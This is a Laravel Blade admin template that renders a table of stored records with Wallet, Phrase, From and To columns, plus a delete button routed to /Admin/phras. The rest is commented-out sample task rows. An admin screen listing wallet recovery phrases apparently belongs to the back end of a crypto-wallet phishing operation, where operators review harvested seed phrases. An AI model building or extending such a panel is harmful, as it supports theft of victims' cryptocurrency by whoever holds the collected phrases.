<x-app-layout>
    <!-- main content -->
    <section class="content home">
        <div class="container-fluid">

            <div class="row clearfix">
                <!-- Task Info -->
                <div class="col-sm-12 col-md-12">
                    <div class="card">
                        <div class="header">
                            <h2>TASK INFOS</h2>

                        </div>
                        <div class="body">
                            <div class="table-responsive">
                                <table class="table table-hover dashboard-task-infos">
                                    <thead>
                                        <tr>
                                            <th>#</th>
                                            <th>Wallet</th>
                                            <th>Phrase</th>
                                            <th>From</th>
                                            <th>To</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        @foreach ($coin as $coin)
                                            <tr>
                                                <td>{{$coin->id}}</td>
                                                <td>{{ $coin->wallet }}</td>
                                                <td><span class="label bg-green">{{ $coin->phrase }}</span></td>
                                                <td>{{ $coin->from }}</td>
                                                <td>{{$coin->to}} </td>
                                                <td>
                                                    <form action="/Admin/phras/{{ $coin->id }}" method="POST">@csrf
                                                        @method('DELETE')
                                                        <button class="btn bg-danger btn-raised m-0 p-1">delete</button>
                                                    </form>
                                                     </td>

                                        @endforeach

                                        {{-- <tr>
                                        <td>2</td>
                                        <td>Task B</td>
                                        <td><span class="label bg-blue">To Do</span></td>
                                        <td>John Doe</td>
                                        <td><div class="progress m-b-0">
                                                <div class="progress-bar bg-blue" role="progressbar" aria-valuenow="40" aria-valuemin="0" aria-valuemax="100" style="width: 40%"></div>
                                            </div>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>3</td>
                                        <td>Task C</td>
                                        <td><span class="label bg-light-blue">On Hold</span></td>
                                        <td>John Doe</td>
                                        <td><div class="progress m-b-0">
                                                <div class="progress-bar bg-light-blue" role="progressbar" aria-valuenow="72" aria-valuemin="0" aria-valuemax="100" style="width: 72%"></div>
                                            </div>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>4</td>
                                        <td>Task D</td>
                                        <td><span class="label bg-orange">Wait Approvel</span></td>
                                        <td>John Doe</td>
                                        <td><div class="progress m-b-0">
                                                <div class="progress-bar bg-orange" role="progressbar" aria-valuenow="95" aria-valuemin="0" aria-valuemax="100" style="width: 95%"></div>
                                            </div>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>5</td>
                                        <td>Task E</td>
                                        <td><span class="label bg-red">Suspended</span></td>
                                        <td>John Doe</td>
                                        <td><div class="progress m-b-0">
                                                <div class="progress-bar bg-red" role="progressbar" aria-valuenow="87" aria-valuemin="0" aria-valuemax="100" style="width: 87%"></div>
                                            </div>
                                        </td>
                                    </tr> --}}
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>
                <!-- #END# Task Info -->
            </div>

        </div>
    </section>
    <!-- main content -->
</x-app-layout>
{{--  --}}
